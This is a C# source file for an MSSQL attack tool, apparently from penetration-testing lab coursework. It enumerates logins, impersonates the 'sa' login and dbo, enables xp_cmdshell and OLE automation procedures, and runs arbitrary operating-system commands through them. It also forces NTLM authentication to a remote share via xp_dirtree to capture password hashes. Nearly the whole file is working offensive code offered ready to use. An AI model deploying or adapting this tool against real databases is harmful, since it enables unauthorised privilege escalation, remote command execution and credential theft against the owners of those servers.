using System;
using System.Data.SqlClient;
using System.IO;

namespace MSSQL
{
    public class MyMssql
    {
        private SqlConnection connection = null;

        public MyMssql(string[] args)
        {
            String serv = args[0];
            String db = args[1];
            String conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
            connection = new SqlConnection(conStr);

            try
            {
                connection.Open();
                Console.WriteLine("[+] Authenticated to MSSQL Server!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failed.");
                Environment.Exit(0);
            }

            switch (args[2])
            {
                case "1":
                    EnumerateLoginInfo();
                    break;
                case "2":
                    this.GetLoginsThatWeCanImpersonate();
                    break;
                case "3":
                    this.ImpersonateLoginAndGetLoginInformation();
                    break;
                case "4":
                    this.EnumerateLinkedServers();
                    break;
                case "5":
                    this.EnableXpCmdshell();
                    break;
                case "6":
                    this.EnableSpOACreate();
                    break;
                case "7":
                    this.TestXpCmdShell();
                    break;
                case "8":
                    if (args.Length != 4)
                    {
                        Console.WriteLine("Example: SQL.exe appsrv01 master 8 \\\\192.168.49.67\\share");
                        return;
                    }

                    this.GrabNTLMHash(args[3]);
                    break;
                case "9":
                    if (args.Length != 4)
                    {
                        Console.WriteLine("Example: SQL.exe appsrv01 master 9 whoami");
                        return;
                    }

                    this.RunXpCmd(args[3]);
                    break;
                case "10":
                    if (args.Length != 4)
                    {
                        Console.WriteLine("Example: SQL.exe appsrv01 master 10 'ping 192.168.49.222'");
                        return;
                    }

                    this.RunOleCmd(args[3]);
                    break;
                case "11":
                    if (args.Length != 4)
                    {
                        Console.WriteLine("Example: SQL.exe appsrv01 master 11 'SELECT 1'");
                        return;
                    }

                    this.RunCustomInLine(args[3]);
                    break;
                case "12":
                    if (args.Length != 4)
                    {
                        Console.WriteLine("Example: SQL.exe appsrv01 master 11 '.\\commands.txt'");
                        return;
                    }

                    this.RunCustomFromFile(args[3]);
                    break;
            }
        }

        public String ExecuteQuery(String query)
        {
            Console.WriteLine($"[*] Execute {query}!");
            SqlCommand cmd = new SqlCommand(query, connection);
            SqlDataReader reader = cmd.ExecuteReader();
            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + "\n";
                }

                reader.Close();
                return result;
            }
            catch
            {
                return "";
            }
        }

        private void GetGroupMembership(String groupToCheck)
        {
            String res = ExecuteQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');");
            int role = int.Parse(res);
            if (role == 1)
            {
                Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group.");
            }
            else
            {
                Console.WriteLine($"[-] User is not a member of the '{groupToCheck}' group.");
            }
        }

        private void EnumerateLoginInfo()
        {
            String login = ExecuteQuery("SELECT SYSTEM_USER;");
            Console.WriteLine($"[*] Logged in as: {login}");
            String uname = ExecuteQuery("SELECT USER_NAME();");
            Console.WriteLine($"[*] Database username: {uname}");
            GetGroupMembership("public");
            GetGroupMembership("sysadmin");
        }

        private void GetLoginsThatWeCanImpersonate()
        {
            String res =
                ExecuteQuery(
                    "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ");
            Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
        }

        private void ImpersonateLoginAndGetLoginInformation()
        {
            String su = ExecuteQuery("SELECT SYSTEM_USER;");
            String un = ExecuteQuery("SELECT USER_NAME();");
            Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
            String res = ExecuteQuery("EXECUTE AS LOGIN = 'sa';");
            Console.WriteLine($"[*] Triggered impersonation.");
            su = ExecuteQuery("SELECT SYSTEM_USER;");
            un = ExecuteQuery("SELECT USER_NAME();");
            Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
        }

        private void EnumerateLinkedServers()
        {
            String res = ExecuteQuery("EXEC sp_linkedservers;");
            Console.WriteLine($"[*] Found linked servers: {res}");
        }

        private void EnableXpCmdshell()
        {
            String res = ExecuteQuery("use msdb; EXECUTE AS USER = 'dbo';");
            Console.WriteLine("[*] Triggered impersonation.");
            res = ExecuteQuery(
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
            Console.WriteLine("[*] Enabled 'xp_cmdshell'.");
        }

        private void EnableSpOACreate()
        {
            String res = ExecuteQuery("use msdb; EXECUTE AS USER = 'dbo';");
            Console.WriteLine("[*] Triggered impersonation.");
            res = ExecuteQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;");
            Console.WriteLine("[*] Enabled OLE automation procedures.");
        }

        private void TestXpCmdShell()
        {
            String cmd = "whoami /all";
            String res = ExecuteQuery($"EXEC xp_cmdshell '{cmd}'");
            Console.WriteLine($"[*] Executed command! Result: {res}");
        }

        private void GrabNTLMHash(String targetShare)
        {
            //String targetShare = "\\\\192.168.49.67\\share";
            String res = ExecuteQuery($"EXEC master..xp_dirtree \"{targetShare}\";");
            Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");
        }

        private void RunXpCmd(String cmd)
        {
            String res = ExecuteQuery($"EXEC xp_cmdshell '{cmd}'");
            Console.WriteLine($"[*] Executed command! Result: {res}");
        }

        private void RunOleCmd(String cmd)
        {
            String res =
                ExecuteQuery(
                    $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{cmd}';");
            Console.WriteLine($"[*] Executed command!");
        }

        private void RunCustomInLine(String cmd)
        {
            Console.WriteLine($"[*] Try execute {cmd} query!");
            String res = ExecuteQuery(cmd);
            Console.WriteLine($"[*] Executed command!");
        }

        private void RunCustomFromFile(String fileName)
        {
            Console.WriteLine($"[*] Try execute queries on file {fileName} !");
            string[] lines = File.ReadAllLines(fileName);

            foreach (var line in lines)
            {
                this.RunCustomInLine(line);
            }
        }
    }

    public class Program
    {
        public static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: SQL.exe target db action [custom]");
                Console.WriteLine("Example: SQL.exe appsrv01 master 11 'SELECT USER_NAME();'");
                Console.WriteLine(".... HELPS ....");
                Console.WriteLine("1 EnumerateLoginInfo");
                Console.WriteLine("2 GetLoginsThatWeCanImpersonate");
                Console.WriteLine("3 ImpersonateLoginAndGetLoginInformation");
                Console.WriteLine("4 EnumerateLinkedServers");
                Console.WriteLine("5 EnableXpCmdshell");
                Console.WriteLine("6 EnableSpOACreate");
                Console.WriteLine("7 TestXpCmdShell");
                Console.WriteLine("8 GrabNTLMHash");
                Console.WriteLine("9 RunXpCmd");
                Console.WriteLine("10 RunOleCmd");
                Console.WriteLine("11 RunCustomInLine");
                Console.WriteLine("12 RunCustomFromFile");
                return;
            }

            MyMssql m = new MyMssql(args);
        }
    }
}